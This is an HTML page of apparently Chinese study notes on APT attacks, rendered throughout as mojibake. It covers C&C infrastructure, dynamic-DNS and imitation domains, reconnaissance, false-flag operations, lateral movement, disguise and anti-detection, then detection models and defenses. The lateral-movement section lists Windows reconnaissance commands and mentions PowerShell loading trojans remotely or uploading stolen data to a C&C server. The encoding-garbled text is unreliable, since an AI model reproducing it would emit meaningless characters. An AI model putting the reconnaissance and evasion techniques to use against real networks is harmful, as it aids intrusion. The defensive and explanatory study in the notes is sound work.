‡æœºçš„æœ¨é©¬ç¨‹åºå‘é€æ§åˆ¶å‘½ä»¤ï¼Œæä¾›ä¸‹è½½èµ„æº(æ–°æœ¨é©¬ï¼Œæœ¨é©¬æ¨¡å—ï¼Œé…ç½®æ–‡ä»¶ç­‰)<br>2.å›æ”¶æœ¨é©¬ç¨‹åºæ”¶é›†åˆ°çš„æƒ…æŠ¥ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ–‡ä»¶ã€é‚®ä»¶ç­‰</p><ul><li><p>åœ°åŸŸåˆ†å¸ƒ</p><ul><li><p>ç¾å›½æœ€å¤šã€å…¶æ¬¡ä¸­å›½ã€ä¿„ç½—æ–¯ï¼Œè¥¿ç­ç‰™ï¼Œå¾·å›½å¹¶åˆ—ç¬¬ä¸‰(2015å¹´)</p><ul><li>ä¸€ä¸ªAPTç»„ç»‡å¯èƒ½æ‹¥æœ‰æ•°åä¸ªï¼Œæˆ–è€…å‡ ä¸ªåˆ†å¸ƒäºä¸åŒåœ°åŸŸçš„C&amp;CæœåŠ¡å™¨</li></ul></li></ul></li><li><p>æ³¨å†Œæœºæ„</p><ul><li><p>å›½å†…å¤–APTç»„ç»‡å‡ä½¿ç”¨æˆ–éƒ¨åˆ†ä½¿ç”¨å¢ƒå¤–æœåŠ¡å•†åŠ¨æ€åŸŸåï¼ŒChangIP,DynDNS,No-IP,Afraid(FreeDNS),dnsExit</p><ul><li>åŠ¨æ€åŸŸåçš„å¥½å¤„ï¼š</li></ul></li></ul></li></ul><p>1.ç›¸å…³æ³¨å†Œä¿¡æ¯ä¸å¯¹å¤–å…¬å¼€(æ— whoisä¿¡æ¯)<br>2.éœ€è¦åŸŸåæŒæœ‰è€…çš„æƒé™æ‰èƒ½æŸ¥è¯¢ç›¸å…³ä¿¡æ¯</p><ul><li><p>æ³¨å†Œåå¥½</p><ul><li><p>æ¨¡ä»¿é‚®ç®±ç±»</p><ul><li>126mailserver ã€mail163ç­‰</li></ul></li><li><p>æ¨¡ä»¿æ€æ¯’è½¯ä»¶ç±»</p><ul><li>safe360ã€risingç­‰</li></ul></li><li><p>æ¨¡ä»¿äº’è”ç½‘å…¬å¸ç±»</p><ul><li>360sc2ã€sohuã€sogouã€sinaç­‰</li></ul></li></ul></li></ul><h2 id="APTæ”»å‡»çš„æˆ˜æœ¯å¸ƒé˜µ"><a href="#APTæ”»å‡»çš„æˆ˜æœ¯å¸ƒé˜µ" class="headerlink" title="APTæ”»å‡»çš„æˆ˜æœ¯å¸ƒé˜µ"></a>APTæ”»å‡»çš„æˆ˜æœ¯å¸ƒé˜µ</h2><h3 id="æƒ…æŠ¥æ”¶é›†"><a href="#æƒ…æŠ¥æ”¶é›†" class="headerlink" title="æƒ…æŠ¥æ”¶é›†"></a>æƒ…æŠ¥æ”¶é›†</h3><ul><li><p>é‡è¦æ€§ï¼šAPTç»„ç»‡å‘åŠ¨ä¸€æ¬¡æ”»å‡»ï¼Œç»å¤§éƒ¨åˆ†æ—¶é—´éƒ½ä¼šæ¶ˆè€—åœ¨æƒ…æŠ¥æ”¶é›†ç¯èŠ‚ä¸Šã€‚ä¸ºäº†è¾¾åˆ°æ”»å‡»ç›®çš„ï¼Œæ”»å‡»è€…å¿…é¡»å°½å¯èƒ½åœ°å…¨é¢çš„æ”¶é›†æ”»å‡»ç›®æ ‡ç›¸å…³çš„æƒ…æŠ¥ä¿¡æ¯ï¼Œä»è®¤çŸ¥æ°´å¹³åˆ°æŒæ¡æ°´å¹³ã€‚</p></li><li><p>å…¬å¼€æƒ…æŠ¥æ”¶é›†</p><ul><li>å®˜æ–¹ç½‘ç«™ã€è¡Œä¸šç½‘ç«™ã€å­¦æœ¯æœŸåˆŠã€è¡Œä¸šä¼šè®®ã€æ–°é—»æŠ¥é“ç­‰</li></ul></li><li><p>åœ°ä¸‹æƒ…æŠ¥æ”¶é›†</p><ul><li>åœ°ä¸‹é»‘å¸‚è´­ä¹°ç¤¾å·¥åº“</li><li>å…¥ä¾µç¬¬ä¸‰æ–¹ç½‘ç«™ä»¥è·å–ç›®æ ‡äººå‘˜ã€ç»„ç»‡çš„æƒ…æŠ¥ä¿¡æ¯</li><li>å‘å…¶ä»–APTç»„ç»‡è´­ä¹°æƒ…æŠ¥ä¿¡æ¯</li></ul></li></ul><h3 id="ç«åŠ›ä¾¦å¯Ÿ"><a href="#ç«åŠ›ä¾¦å¯Ÿ" class="headerlink" title="ç«åŠ›ä¾¦å¯Ÿ"></a>ç«åŠ›ä¾¦å¯Ÿ</h3><ul><li>ç›®çš„ï¼šæ”¶é›†æ”»å‡»ç›®æ ‡ç½‘ç»œæˆ–è®¾å¤‡çš„åŸºæœ¬ä¿¡æ¯ã€åˆ¤æ–­æ”»å‡»ç›®æ ‡çš„çœŸä¼ª(æ˜¯å¦ä¸ºè™šæ‹Ÿæœº)ã€é˜²å¾¡èƒ½åŠ›ã€æ”»å‡»ä»·å€¼ã€‚ä»¥åŠæ–¹ä¾¿åæœŸæ¨ªå‘ç§»åŠ¨çš„å‡†ç¡®æ€§ã€‚</li><li>ä¸»æœºä¿¡æ¯ï¼šæ“ä½œç³»ç»Ÿä¿¡æ¯ã€ä¸»æœºåç§°ã€æœ¬åœ°ç”¨æˆ·åç­‰</li><li>ç½‘ç»œä¿¡æ¯ï¼šä¸»è¦æ˜¯IPåœ°å€ã€ç½‘å…³ä¿¡æ¯</li><li>åº”ç”¨ç¨‹åºä¿¡æ¯åŠç›¸å…³ç‰ˆæœ¬ä¿¡æ¯ï¼Œå¾®è½¯Officeã€å¾®è½¯Internet Explorer</li><li>ç£ç›˜ä¿¡æ¯ã€å½“å‰è¿›ç¨‹ä¿¡æ¯ç­‰</li></ul><h3 id="ä¾›åº”é“¾æ”»å‡»"><a href="#ä¾›åº”é“¾æ”»å‡»" class="headerlink" title="ä¾›åº”é“¾æ”»å‡»"></a>ä¾›åº”é“¾æ”»å‡»</h3><ul><li><p>æ”»å‡»åŸç†</p><ul><li>å½“æ”»å‡»ç›®æ ‡æœ¬èº«çš„é˜²å¾¡æªæ–½ç‰¹åˆ«å®Œå–„æ—¶ï¼Œæˆ–åˆå§‹æ”»å‡»æ— æ³•è¾¾åˆ°æ•ˆæœï¼Œå¯¹ç›®æ ‡ç›¸å…³çš„å‘¨è¾¹ä¼ä¸šã€äººå‘˜ã€ä¾›åº”é“¾è¿›è¡Œæ”»å‡»ï¼Œæœ‰å¯èƒ½å–å¾—è¾ƒå¥½çš„æ•ˆæœã€‚</li></ul></li><li><p>å…¸å‹æ¡ˆä¾‹</p><ul><li>éœ‡ç½‘ç—…æ¯’ã€Havex</li></ul></li></ul><h3 id="å‡æ——è¡ŒåŠ¨"><a href="#å‡æ——è¡ŒåŠ¨" class="headerlink" title="å‡æ——è¡ŒåŠ¨"></a>å‡æ——è¡ŒåŠ¨</h3><ul><li><p>æ¦‚è¿°</p><ul><li><p>ä¹Ÿå«ä¼ªæ——è¡ŒåŠ¨ï¼Œæ˜¯éšè”½è¡ŒåŠ¨çš„ä¸€ç§ã€‚é€šè¿‡ä½¿ç”¨å…¶ä»–ç»„ç»‡çš„æ——å¸œã€åˆ¶æœç­‰æ‰‹æ®µè¯¯å¯¼å…¬ä¼—ã€ä½¿å…¬ä¼—è®¤ä¸ºè¯¥æ”»å‡»æ˜¯å…¶ä»–æ”»å‡»ç»„ç»‡æ‰§è¡Œã€‚</p><ul><li>ç›¸å…³æˆ˜æœ¯æœ¯è¯­ï¼šæ‹Ÿæ€ã€è¯±é¥µã€æ··æ·†ã€ä¼ªè£…ã€å¹²æ‰°</li></ul></li></ul></li><li><p>ç±»å‹</p><ul><li><p>é¢„è®¾é™·é˜±</p><ul><li>æ ·æœ¬æ–‡ä»¶ã€C&amp;CæœåŠ¡å™¨åŸŸåã€ç‰¹æ®Šå­—ç¬¦ä¸²ã€ä¸Šçº¿å¯†ç ã€è¯±é¥µæ–‡æ¡£å±æ€§ä¿¡æ¯ç­‰</li></ul></li><li><p>äº‹åæ©ç›–</p><ul><li>æ”»å‡»æˆåŠŸåï¼Œå¯¹åŸŸåwhoisã€IPåœ°å€ç­‰ä¿¡æ¯è¿›è¡Œä¼ªè£…</li></ul></li></ul></li><li><p>å†’å……å¯¹è±¡</p><ul><li>å†’å……å…¶ä»–APTç»„ç»‡</li><li>å†’å……æ™®é€šç”¨æˆ·</li></ul></li><li><p>å›½å®¶çº§æƒ…æŠ¥æœºæ„å¯¹è¯¥è¡ŒåŠ¨çš„è§‚ç‚¹</p><ul><li><p>äº”çœ¼è”ç›Ÿ</p><ul><li>ä¸æ¬ºéª—ç›¸å…³çš„ç­–ç•¥ï¼šæš—åŒº(DarkSpace)ã€èœœç½(Honeypot)ã€èœœä»¤(Honeytoken)ã€èœœç½‘(Honeynet)ã€å‡æ——è¡ŒåŠ¨(False Flag)ã€æ•ˆæœ(Effects)</li></ul></li><li><p>äº”çœ¼è”ç›Ÿå¯¹å‡æ——è¡ŒåŠ¨çš„è§‚ç‚¹ï¼š1.æœ‰æ„åˆ¶é€ æ”»å‡»ç›®æ ‡ä¸è¢«å«ç¥¸å›½æˆ–ç»„ç»‡é—´ç´§å¼ çš„æ•Œå¯¹æ°”æ°›ï¼Œä»¥å®ç°æŸç§æ”¿æ²»æˆ–ç»æµç›®çš„ 2.æ›´å¥½åœ°éšè—è‡ªå·±ï¼Œé¿å…æš´éœ²ï¼Œæ”¶è·æ›´å¤§åˆ©ç›Šã€‚</p></li></ul></li></ul><h3 id="å‘¨æœŸæ€§è¢­æ‰°"><a href="#å‘¨æœŸæ€§è¢­æ‰°" class="headerlink" title="å‘¨æœŸæ€§è¢­æ‰°"></a>å‘¨æœŸæ€§è¢­æ‰°</h3><ul><li>å‘¨ä¸€ã€äºŒï¼ˆå·¥ä½œæ—¥å¤„ç†é‚®ä»¶ã€æ–‡ä»¶é«˜å³°æœŸï¼‰</li><li>å¤§å‹èŠ‚æ—¥ï¼ˆå¦‚å›½åº†èŠ‚ã€æ˜¥èŠ‚ç­‰ï¼‰</li></ul><h3 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h3><ul><li>ç›®çš„ï¼š</li></ul><p>1.è¿›ä¸€æ­¥åœ¨æ„ŸæŸ“çš„ç›®æ ‡æœºå™¨ä¸Šè·å–æ›´å¤šæœ‰ä»·å€¼çš„ä¿¡æ¯<br>2. å€ŸåŠ©å—æ„ŸæŸ“çš„æœºå™¨ï¼Œæ¢æµ‹å‘¨è¾¹å…¶ä»–è®¾å¤‡çš„æƒ…å†µæˆ–ç›´æ¥å‘å‘¨è¾¹è®¾å¤‡å‘åŠ¨æ”»å‡»</p><ul><li><p>æ¨ªå‘ç§»åŠ¨æ”»å‡»æ­¥éª¤</p><ul><li>ä¾¦å¯Ÿå’Œè¯†åˆ«ç½‘ç»œæ‹“æ‰‘ã€è·å–åŸŸè®¡ç®—æœºä¿¡æ¯ã€å½“å‰è®¡ç®—æœºç›¸å…³ä¸»æœºä¿¡æ¯ã€ç½‘å¡ä¿¡æ¯ã€è·¯ç”±ä¿¡æ¯ç­‰</li><li>æŸ¥çœ‹è¿œç¨‹è®¡ç®—æœºæœåŠ¡åŠçŠ¶æ€ã€è·å–æŒ‡å®šIPå…±äº«ä¿¡æ¯ã€å…±äº«ç›®å½•ã€æ‰«æå†…ç½‘æœºå™¨è¿œç¨‹ç«¯å£ç­‰</li><li>è¡¥å……åŸæœ‰æœ¨é©¬æ²¡æœ‰çš„åŠŸèƒ½ã€çªƒå–æœ¬æœºæ›´å¤šä¿¡æ¯ã€å‘å‘¨è¾¹å…¶ä»–è®¾å¤‡å‘åŠ¨æ”»å‡»</li><li>å¸¸ç”¨å‘½ä»¤ï¼šnet viewã€ipconfig /allã€netstat -a/nã€nbstat -Aã€systeminfoã€tracert -w 1000 8.8.8.8ã€pingã€telnetã€åˆ©ç”¨PowerShellè¿œç¨‹åŠ è½½æœ¨é©¬æˆ–è€…ä¸Šä¼ æƒ…æŠ¥ä¿¡æ¯åˆ°C&amp;CæœåŠ¡å™¨</li></ul></li></ul><h3 id="ä¼ªè£…æœ¯"><a href="#ä¼ªè£…æœ¯" class="headerlink" title="ä¼ªè£…æœ¯"></a>ä¼ªè£…æœ¯</h3><ul><li><p>ç¤¾ä¼šå·¥ç¨‹å­¦ä¼ªè£…</p><ul><li>é‚®ä»¶å†…å®¹ä¼ªè£…</li><li>é‚®ä»¶èº«ä»½ä¼ªè£…</li></ul></li><li><p>æ–‡ä»¶è§†è§‰ä¼ªè£…</p><ul><li>æ–‡ä»¶å</li><li>æ–‡ä»¶æ‰©å±•å</li><li>æ–‡ä»¶å›¾æ ‡</li></ul></li><li><p>å¿«æ·æ–¹å¼ä¼ªè£…</p><ul><li>å°†æ”»å‡»ä»£ç æ–‡ä»¶å’Œä¸€ä¸ªæŒ‡å‘æ”»å‡»ä»£ç çš„å¿«æ·æ–¹å¼æ–‡ä»¶æ‰“åŒ…æˆä¸€ä¸ªå‹ç¼©åŒ…ï¼ŒåŒæ—¶ï¼Œå¿«æ·æ–¹å¼çš„å‘½åå…·æœ‰è¿·æƒ‘æ€§</li></ul></li><li><p>æ†ç»‘åˆæ³•ç¨‹åº</p><ul><li><p>AWVS7</p><ul><li>é’ˆå¯¹ç½‘ç»œå®‰å…¨è¡Œä¸š</li></ul></li><li><p>åŠå…¬è½¯ä»¶</p><ul><li>æ”¿åºœå•ä½ã€äº‹ä¸šå•ä½</li></ul></li><li><p>å³æ—¶é€šã€è¯ä¹¦é©±åŠ¨</p><ul><li>æ”¿åºœæœºæ„</li></ul></li><li><p>å¾®è½¯æ›´æ–°ç¨‹åº</p></li><li><p>Microsoft Visio Professional 2013</p></li></ul></li><li><p>å‹ç¼©åŒ…å¤–å£³</p><ul><li>å°†æœ¨é©¬ç¨‹åºè¿›è¡Œå‹ç¼©ï¼Œä»¥å‹ç¼©åŒ…çš„å½¢å¼ä¼ æ’­</li></ul></li></ul><h3 id="åä¾¦å¯Ÿæœ¯"><a href="#åä¾¦å¯Ÿæœ¯" class="headerlink" title="åä¾¦å¯Ÿæœ¯"></a>åä¾¦å¯Ÿæœ¯</h3><ul><li>ä¸€äº›APTç»„ç»‡çš„æ”»å‡»æœ¨é©¬ä¼šåˆ¤æ–­è‡ªèº«æ‰€å¤„çš„ç¯å¢ƒã€å‘ç°æ€è½¯æ—¶ã€ä¼šé€‰æ‹©æ”¾å¼ƒæ‰§è¡Œåç»­çš„åŠŸèƒ½ä»£ç ã€æˆ–è€…è®¾æ³•ç»•è¿‡æ€è½¯çš„ç›‘æµ‹ã€‚</li><li>ä¸€äº›APTç»„ç»‡ä¼šå¯¹å®‰å…¨ç ”ç©¶äººå‘˜è¿›è¡Œåå‘ä¾¦å¯Ÿå·¥ä½œï¼Œæ¯”å¦‚æµ·è²èŠ±ç»„ç»‡å‘AWVSçš„ç ´è§£ç‰ˆä¸­æ’å…¥äº†æœ¨é©¬ã€‚</li></ul><h2 id="APTæ”»å‡»çš„ç›‘æµ‹ä¸é˜²å¾¡"><a href="#APTæ”»å‡»çš„ç›‘æµ‹ä¸é˜²å¾¡" class="headerlink" title="APTæ”»å‡»çš„ç›‘æµ‹ä¸é˜²å¾¡"></a>APTæ”»å‡»çš„ç›‘æµ‹ä¸é˜²å¾¡</h2><h3 id="å¦‚ä½•å‘ç°APTæ”»å‡»"><a href="#å¦‚ä½•å‘ç°APTæ”»å‡»" class="headerlink" title="å¦‚ä½•å‘ç°APTæ”»å‡»"></a>å¦‚ä½•å‘ç°APTæ”»å‡»</h3><ul><li><p>å¤§æ•°æ®æŠ€æœ¯</p><ul><li>æ•°æ®é‡‡é›†ã€æ•°æ®åˆ†æã€æ•°æ®å‘ˆç°</li></ul></li><li><p>å¨èƒæƒ…æŠ¥æŠ€æœ¯</p><ul><li><p>â€œæ ‡å¿—â€(Indicator of Compromise,IOC),ä¹Ÿå«å…¥ä¾µæŒ‡ç¤ºå™¨ï¼šé€šå¸¸åŒ…æ‹¬ä¸»æœºæ´»åŠ¨ä¸­å‡ºç°çš„æ–‡ä»¶ã€è¿›ç¨‹ã€æ³¨å†Œè¡¨é”®å€¼ã€ç³»ç»ŸæœåŠ¡ã€ç½‘ç»œä¸Šçš„åŸŸåã€URLã€IPç­‰</p></li><li><p>åˆ†ç±»</p><ul><li><p>æˆ˜æœ¯æƒ…æŠ¥</p><ul><li>æ ‡è®°æ”»å‡»è€…ä½¿ç”¨å·¥å…·ç›¸å…³çš„ç‰¹çº¸å€¼åŠç½‘ç»œåŸºç¡€è®¾æ–½ä¿¡æ¯ã€å¯ç›´æ¥ç”¨äºè®¾å¤‡ã€å®ç°å¯¹æ”»å‡»æ´»åŠ¨çš„ç›‘æ§ï¼ŒIOCå³æ˜¯ä¸€ä¸ªå…¸å‹</li></ul></li><li><p>ä½œæˆ˜æƒ…æŠ¥</p><ul><li>æè¿°æ”»å‡»è€…çš„å·¥å…·ã€æŠ€æœ¯å’Œè¿‡ç¨‹ï¼Œå³TTP</li></ul></li><li><p>æˆ˜ç•¥æƒ…æŠ¥</p><ul><li>æè¿°å½“å‰å¯¹äºç‰¹å®šç»„ç»‡çš„å¨èƒç±»å‹å’Œå¯¹æ‰‹ç°çŠ¶ã€æŒ‡å¯¼å®‰å…¨æŠ•èµ„çš„å¤§æ–¹å‘ã€‚ä½¿ç”¨è€…ä¸ºCSO(Chief Security Officer), CISO(Chief Information Security Offier)</li></ul></li></ul></li><li><p>å¨èƒæƒ…æŠ¥çš„åˆ©ç”¨</p><ul><li><p>~åœ¨å‡†å¤‡é˜¶æ®µã€æ£€æµ‹ä¸åˆ†æé˜¶æ®µã€éš”ç¦»ï¼Œæ¸…é™¤ï¼Œä¸æ¢å¤é˜¶æ®µã€äº‹åå¤ç›˜é˜¶æ®µçš„ä½œç”¨</p></li><li><p>å®‰å…¨è¿è¥å›¢é˜Ÿä¼šé‡åˆ°çš„é—®é¢˜</p><ul><li>å¦‚ä½•é«˜æ•ˆåœ°å‘ç°æ”»å‡»å’Œå…¥ä¾µæ´»åŠ¨ï¼Œè¯„ä¼°å½±å“é¢</li><li>å¦‚ä½•è·å–ã€å¤„ç½®ä¸å·²ç»å‘ç°å®‰å…¨äº‹ä»¶ç›¸å…³çš„æ´»åŠ¨</li><li>å¦‚ä½•åŸºäºå¯¹å¯¹æ‰‹çš„äº†è§£ã€è®¾ç½®å„ä¸ªç¯èŠ‚ä¸Šçš„å®‰å…¨æ§åˆ¶æªæ–½ã€ä»¥é˜»æ­¢ç›¸åŒå¯¹æ‰‹æˆ–ç±»ä¼¼æ”»å‡»æ‰‹æ³•çš„å…¥ä¾µ</li><li>ç†è§£ç›®å‰å®‰å…¨å¨èƒçš„å…¨è²Œã€å®ç°æœ‰æ•ˆçš„å®‰å…¨æŠ•èµ„</li></ul></li></ul></li></ul></li><li><p>æµé‡å¨èƒæ£€æµ‹æŠ€æœ¯</p><ul><li>æµé‡å¨èƒåˆ†æ</li><li>æµé‡æ—¥å¿—å­˜å‚¨</li><li>å¨èƒå›æº¯åˆ†æ</li></ul></li><li><p>ç½‘ç»œæ£€æµ‹å“åº”æŠ€æœ¯(Network-based Detection and Response,NDR)</p></li><li><p>ç»ˆç«¯æ£€æµ‹å“åº”æŠ€æœ¯(Endpoint Detection and Response,EDR)</p><ul><li>åŸºäºç»ˆç«¯å¤§æ•°æ®åˆ†æçš„æ–°ä¸€ä»£ç»ˆç«¯å®‰å…¨äº§å“ï¼Œèƒ½å¯¹ç»ˆç«¯è¡Œä¸ºæ•°æ®è¿›è¡Œå…¨é¢é‡‡é›†ã€å®æ—¶ä¸Šä¼ ã€å¯¹ç»ˆç«¯è¿›è¡ŒæŒç»­æ£€æµ‹å’Œåˆ†æã€å¢å¼ºå¯¹å†…éƒ¨å¨èƒäº‹ä»¶çš„æ·±åº¦å¯è§æ€§ï¼Œç»“åˆç›¸å…³å¨èƒæƒ…æŠ¥ä¸­å¿ƒæ¨é€çš„æƒ…æŠ¥ä¿¡æ¯(IPã€URLã€æ–‡ä»¶Hashç­‰)èƒ½å¸®åŠ©ä¼ä¸šå¿«é€Ÿå‘ç°ï¼Œç²¾ç¡®å®šä½é«˜çº§å¨èƒå…¥ä¾µ</li></ul></li></ul><h3 id="å¦‚ä½•åˆ†æAPTæ”»å‡»"><a href="#å¦‚ä½•åˆ†æAPTæ”»å‡»" class="headerlink" title="å¦‚ä½•åˆ†æAPTæ”»å‡»"></a>å¦‚ä½•åˆ†æAPTæ”»å‡»</h3><ul><li><p>ç½‘ç»œæ€ä¼¤é“¾æ¨¡å‹(Cyber Kill Chain)</p><ul><li><p>ä¾¦å¯Ÿ</p><ul><li>æ”»å‡»è€…é€‰æ‹©ç›®æ ‡ã€è¿›è¡Œç ”ç©¶ã€æœé›†ç›®æ ‡å¼±ç‚¹</li></ul></li><li><p>æ­¦å™¨åŒ–</p><ul><li>æ”»å‡»è€…åˆ›å»ºé’ˆå¯¹ä¸€ä¸ªæˆ–å¤šä¸ªæ¼æ´å®šåˆ¶çš„è¿œç¨‹è®¿é—®æ¶æ„ç¨‹åºæ­¦å™¨ï¼Œæ¯”å¦‚ç—…æ¯’æˆ–è •è™«</li></ul></li><li><p>æ•£å¸ƒ</p><ul><li>å°†ç½‘ç»œæ­¦å™¨åŒ…å‘ç›®æ ‡æŠ•æ”¾</li></ul></li><li><p>æ¶ç”¨</p><ul><li>åœ¨å—å®³è€…ç³»ç»Ÿä¸Šè¿è¡Œä»£ç </li></ul></li><li><p>è®¾ç½®</p><ul><li>åœ¨ç›®æ ‡ä½ç½®å®‰è£…æ¶æ„ç¨‹åº</li></ul></li><li><p>å‘½ä»¤å’Œæ§åˆ¶</p><ul><li>ä¸ºæ”»å‡»è€…å»ºç«‹å¯è¿œç¨‹æ§åˆ¶ç›®æ ‡ç³»ç»Ÿçš„è·¯å¾„</li></ul></li><li><p>ç›®æ ‡è¾¾æˆ</p><ul><li>æ”»å‡»è€…è¿œç¨‹å®Œæˆå…¶é¢„æœŸæ•ˆæœ</li></ul></li></ul></li><li><p>é’»çŸ³æ¨¡å‹</p><ul><li><p>æ”»å‡»è€…</p><ul><li>åˆ†æ¸…æ”»å‡»è€…æœ‰åˆ©ç”¨äº†è§£å…¶ç›®çš„ã€å½’å±ã€é€‚åº”æ€§å’ŒæŒä¹…æ€§</li></ul></li><li><p>èƒ½åŠ›</p><ul><li>äº‹ä»¶ä¸­ä½¿ç”¨çš„å·¥å…·æˆ–æŠ€æœ¯</li></ul></li><li><p>åŸºç¡€è®¾æ–½</p><ul><li>æ”»å‡»è€…ç”¨æ¥ä¼ é€’èƒ½åŠ›çš„ç‰©ç†æˆ–é€»è¾‘ç»“æ„ï¼Œå¦‚IPåœ°å€ã€åŸŸåã€é‚®ä»¶åœ°å€ã€USBè®¾å¤‡ç­‰</li></ul></li><li><p>å—å®³è€…</p><ul><li>ä»¥ç¤¾ä¼š-æ”¿æ²»ä¸ºæ”¯ç‚¹çš„å®‰å…¨åˆ†æä¸­ï¼Œå—å®³è€…ä½œç”¨é‡å¤§</li></ul></li></ul></li><li><p>è‡ªé€‚åº”å®‰å…¨æ¶æ„(Adaptive Security Architecture,ASA)</p><ul><li>ç”±ç¾å›½å®‰å…¨å…¬å¸Gartneräº2014å¹´æå‡ºçš„é¢å‘æœªæ¥çš„ä¸‹ä¸€ä»£å®‰å…¨æ¶æ„ï¼Œä»é¢„æµ‹ã€é˜²å¾¡ã€æ£€æµ‹ã€å“åº”å››ä¸ªç»´åº¦ï¼Œå¼ºåº¦å®‰å…¨é˜²æŠ¤æ˜¯ä¸€ä¸ªæŒç»­å¤„ç†ã€å¾ªç¯çš„è¿‡ç¨‹ï¼Œæ˜¯ç»†ç²’åº¦ã€å¤šè§’åº¦ã€æŒç»­åŒ–åœ°å¯¹å®‰å…¨å¨èƒè¿›è¡Œå®æ—¶åŠ¨æ€åˆ†æ</li><li>ç›®çš„ï¼šä¸ºäº†è§£å†³å½“å‰ä¼ä¸šçš„å®‰å…¨é˜²æŠ¤åŠŸèƒ½éš¾ä»¥åº”å¯¹é«˜çº§å®šå‘æ”»å‡»çš„é—®é¢˜</li><li>æœ€ç»ˆæ•ˆæœï¼šè¾¾åˆ°ç½‘ç»œå®‰å…¨çš„å¯ç®¡ã€å¯æ§ã€å¯è§†ã€å¯è°ƒåº¦ã€å¯æŒç»­</li></ul></li></ul><h3 id="ååŒè”åŠ¨çš„çºµæ·±é˜²å¾¡ä½“ç³»"><a href="#ååŒè”åŠ¨çš„çºµæ·±é˜²å¾¡ä½“ç³»" class="headerlink" title="ååŒè”åŠ¨çš„çºµæ·±é˜²å¾¡ä½“ç³»"></a>ååŒè”åŠ¨çš„çºµæ·±é˜²å¾¡ä½“ç³»</h3><ul><li><p>é«˜çº§å®‰å…¨å¨èƒçš„åˆ¤å®š</p><ul><li>ç»“åˆå¤šæºå¤´å¨èƒæƒ…æŠ¥åº”ç”¨ã€æ²™ç®±åŠ¨æ€è¡Œä¸ºå‘ç°ã€å…³è”å¼•æ“åˆ†æ</li></ul></li><li><p>å®‰å…¨å¨èƒçš„å¤„ç½®</p><ul><li>NDRä¸EDRè”åŠ¨</li></ul></li></ul><h2 id="APTæ”»å‡»æŠ€æœ¯-è¶‹åŠ¿"><a href="#APTæ”»å‡»æŠ€æœ¯-è¶‹åŠ¿" class="headerlink" title="APTæ”»å‡»æŠ€æœ¯(è¶‹åŠ¿)"></a>APTæ”»å‡»æŠ€æœ¯(è¶‹åŠ¿)</h2><h3 id="æŠ€æœ¯è¶Šå‘é«˜è¶…"><a href="#æŠ€æœ¯è¶Šå‘é«˜è¶…" class="headerlink" title="æŠ€æœ¯è¶Šå‘é«˜è¶…"></a>æŠ€æœ¯è¶Šå‘é«˜è¶…</h3><ul><li><p>éPEæ–‡ä»¶æ–‡ä»¶æ”»å‡»</p><ul><li>æ–‡ä»¶æ— éœ€é•¿æœŸé©»ç•™ç£ç›˜</li><li>æ ¸å¿ƒPayloadå­˜æ”¾åœ¨ç½‘ç»œæˆ–æ³¨å†Œè¡¨</li><li>é€šè¿‡ç³»ç»Ÿè¿›ç¨‹æ‰§è¡ŒPayload</li></ul></li><li><p>å¼€æºå·¥å…·å’Œè‡ªåŠ¨åŒ–æ”»å‡»æ¡†æ¶</p><ul><li><p>PowerShellè‡ªåŠ¨åŒ–æ”»å‡»æ¡†æ¶</p></li><li><p>CobaltStrike</p><ul><li>Shellcode</li><li>Beacon</li></ul></li><li><p>Koadic</p></li></ul></li><li><p>â€œLiving off the landâ€æŠ€æœ¯</p></li></ul><h3 id="å›½é™…å†²çªåœ°åŒºçš„APTæ”»å‡»æ›´åŠ æ´»è·ƒ"><a href="#å›½é™…å†²çªåœ°åŒºçš„APTæ”»å‡»æ›´åŠ æ´»è·ƒ" class="headerlink" title="å›½é™…å†²çªåœ°åŒºçš„APTæ”»å‡»æ›´åŠ æ´»è·ƒ"></a>å›½é™…å†²çªåœ°åŒºçš„APTæ”»å‡»æ›´åŠ æ´»è·ƒ</h3><ul><li>èƒ½æºèµ„æºã€å·¥ä¸šã€æŒæœ‰ä¸åŒæ”¿è§è€…</li><li>è¿™ç±»APTç»„ç»‡ï¼šé»„é‡‘é¼ ã€äººé¢ç‹®ã€APT33ã€APT34ç­‰</li></ul><h3 id="ç½‘ç»œç©ºé—´å·²æˆä¸ºå¤§å›½åšå¼ˆæ–°æˆ˜åœº"><a href="#ç½‘ç»œç©ºé—´å·²æˆä¸ºå¤§å›½åšå¼ˆæ–°æˆ˜åœº" class="headerlink" title="ç½‘ç»œç©ºé—´å·²æˆä¸ºå¤§å›½åšå¼ˆæ–°æˆ˜åœº"></a>ç½‘ç»œç©ºé—´å·²æˆä¸ºå¤§å›½åšå¼ˆæ–°æˆ˜åœº</h3><ul><li>å½±å“é¢ï¼šæ”¿æ²»ã€ç»æµã€å†›äº‹è°ˆåˆ¤ç­‰</li></ul><h3 id="é’ˆå¯¹åŸºç¡€è®¾æ–½çš„ç ´åæ€§æ”»å‡»æ—¥ç›Šæ´»è·ƒ"><a href="#é’ˆå¯¹åŸºç¡€è®¾æ–½çš„ç ´åæ€§æ”»å‡»æ—¥ç›Šæ´»è·ƒ" class="headerlink" title="é’ˆå¯¹åŸºç¡€è®¾æ–½çš„ç ´åæ€§æ”»å‡»æ—¥ç›Šæ´»è·ƒ"></a>é’ˆå¯¹åŸºç¡€è®¾æ–½çš„ç ´åæ€§æ”»å‡»æ—¥ç›Šæ´»è·ƒ</h3><ul><li>â€œäº’è”ç½‘+â€ã€5Gã€ä¸‡ç‰©äº’è”ç­‰æ–°å…´æŠ€æœ¯çš„å…´èµ·</li><li>æ¶‰åŠè¡Œä¸šï¼šèƒ½æºã€äº¤é€šã€åˆ¶é€ ã€é‡‘èã€é€šä¿¡ç­‰é¢†åŸŸ</li><li>ç°çŠ¶ï¼šå¾ˆå¤šåŸºç¡€è®¾æ–½å’Œç”Ÿäº§ç³»ç»Ÿçš„ç½‘ç»œå®‰å…¨ä½“ç³»å»ºè®¾è¿˜åŸºæœ¬ä¸ºé›¶</li></ul><h3 id="é’ˆå¯¹ä¸ªäººç§»åŠ¨ç»ˆç«¯æ”»å‡»æ˜¾è‘—å¢åŠ "><a href="#é’ˆå¯¹ä¸ªäººç§»åŠ¨ç»ˆç«¯æ”»å‡»æ˜¾è‘—å¢åŠ " class="headerlink" title="é’ˆå¯¹ä¸ªäººç§»åŠ¨ç»ˆç«¯æ”»å‡»æ˜¾è‘—å¢åŠ 